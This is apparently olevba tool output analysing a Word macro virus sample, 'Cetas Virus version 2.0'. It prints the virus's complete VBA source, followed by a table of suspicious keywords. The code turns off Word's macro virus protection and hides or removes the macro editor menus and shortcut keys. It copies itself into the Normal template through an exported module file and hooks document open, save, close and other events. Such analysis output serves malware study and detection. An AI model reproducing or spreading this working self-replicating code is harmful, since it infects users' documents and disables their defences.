olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.s
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.s - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xHeCs2.bas 
in file: Virus.MSWord.Opey.s - OLE stream: 'Macros/VBA/xHeCs2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub vxConTrol()
'
' Cetas Virus version 2.0 by xHeCs
' ATTENTION LAMERS that's you !!!.
'     You can learn a lot from this virus, But Please respect
' What is not yours.
'
On Error Resume Next
Application.UserName = "PAcMAn"
Application.UserAddress = "PAcMAn ZonE"
Application.UserInitials = "xHeCs"
With Dialogs(wdDialogFileSummaryInfo)
        .Author = "xHeCs"
        .Comments = "Life is like a box of chocolate you'll never know what your gonna get :)"
        .Execute
End With
With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
End With
With ActiveDocument
   .ReadOnlyRecommended = False
End With
On Error Resume Next
CommandBars("Visual Basic").Visible = False
CommandBars("Visual Basic").Enabled = False
CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
CommandBars("Visual Basic").Protection = msoBarNoCustomize
CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Customize...").Delete
CustomizationContext = NormalTemplate
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Application.VBE.ActiveVBProject.VBComponents("xHeCs2").Export "c:\WinCTL.sys"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
  If NormalTemplate.VBProject.VBComponents(I).Name = "xHeCs2" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
  If ActiveDocument.VBProject.VBComponents(I).Name = "xHeCs2" Then ActivInstall = True
Next I
If ActivInstall = True And NormInstall = False Then Set Target = NormalTemplate.VBProject _
Else: If ActivInstall = False And NormInstall = True Then Set Target = ActiveDocument.VBProject
Target.VBComponents.Import ("c:\WinCtl.sys")
End Sub
Sub FileSave()
    On Error Resume Next
    Call vxConTrol
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call vxConTrol
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call vxConTrol
End Sub
Sub FileExit()
    On Error Resume Next
    Call vxConTrol
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call vxConTrol
End Sub
Sub EditFind()
    On Error Resume Next
    Dialogs(wdDialogEditFind).Show
    Call vxConTrol
End Sub
Sub AutoExec()
    On Error Resume Next
    Call vxConTrol
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call vxConTrol
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call vxConTrol
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call vxConTrol
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call vxConTrol
End Sub
Function Delay()
    For I = 0 To 10000000
    Next I
End Function
Sub AutoClose()
    On Error Resume Next
    Call vxConTrol
    If (Minute(Time) = 35) Then
        If (Second(Time) Mod 2) = 0 Then
           Response = MsgBox("Do You want to Close this Document ?", vbYesNo + vbCritical)
           Delay
           If (Response = 7) Then GoTo NoBox
           Response = MsgBox("Are you sure you want to Close this Document ?", vbYesNo + vbCritical)
           Delay
           If (Response = 7) Then GoTo NoBox
           Response = MsgBox("Are you Really sure you want to Close this Document ?", vbYesNo + vbCritical)
           Delay
           If (Response = 7) Then GoTo NoBox
           Response = MsgBox("Are you Really Really sure you want to Close this Document ?", vbYesNo + vbCritical)
           Delay
           If (Response = 7) Then GoTo NoBox
           Response = MsgBox("Are you Absolutely sure you want to Close this Document ?", vbYesNo + vbCritical)
           Delay
           If (Response = 7) Then GoTo NoBox
           MsgBox "Cetas Virus Version 2.0 by xHeCs", vbCritical
    End If
    End If
NoBox:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

